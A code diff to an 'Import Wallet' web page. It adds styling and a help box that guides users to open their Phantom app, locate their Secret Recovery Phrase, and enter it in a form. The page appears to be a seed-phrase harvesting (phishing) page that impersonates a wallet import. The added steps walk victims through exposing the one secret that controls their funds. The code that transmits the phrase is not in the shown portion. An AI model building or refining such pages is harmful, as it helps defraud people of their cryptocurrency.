@@ -63,7 +63,26 @@
       cursor: pointer;
       opacity: 1;
     }
-
+    /* New help section */
+    #helpSection {
+      text-align: left;
+      background: rgba(255, 255, 255, 0.1);
+      padding: 15px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      font-size: 0.9rem;
+      line-height: 1.4;
+      user-select: none;
+    }
+    #helpSection strong {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 1.1rem;
+    }
+    #helpSection ol {
+      padding-left: 20px;
+      margin: 0;
+    }
     /* Loading screen styles */
     #loadingScreen {
       display: none;
@@ -89,7 +108,6 @@
         transform: rotate(360deg);
       }
     }
-
     /* Confirmation screen */
     #confirmScreen {
       display: none;
@@ -154,6 +172,17 @@
     />
     <h1>Import Wallet</h1>
     <p>Securely access your existing wallet using your Secret Recovery Phrase.</p>
+
+    <div id="helpSection">
+      <strong>Need help finding your Secret Recovery Phrase?</strong>
+      <ol>
+        <li>Open your Phantom wallet app.</li>
+        <li>Go to <em>Settings</em> &gt; <em>Security</em> or <em>Backup</em>.</li>
+        <li>Look for <em>Secret Recovery Phrase</em> or <em>Seed Phrase</em>.</li>
+        <li>Write down the 12 or 24 words in order. Keep it safe and private.</li>
+      </ol>
+    </div>
+
     <textarea
       id="phrase"
       placeholder="Enter your 12 or 24-word phrase..."
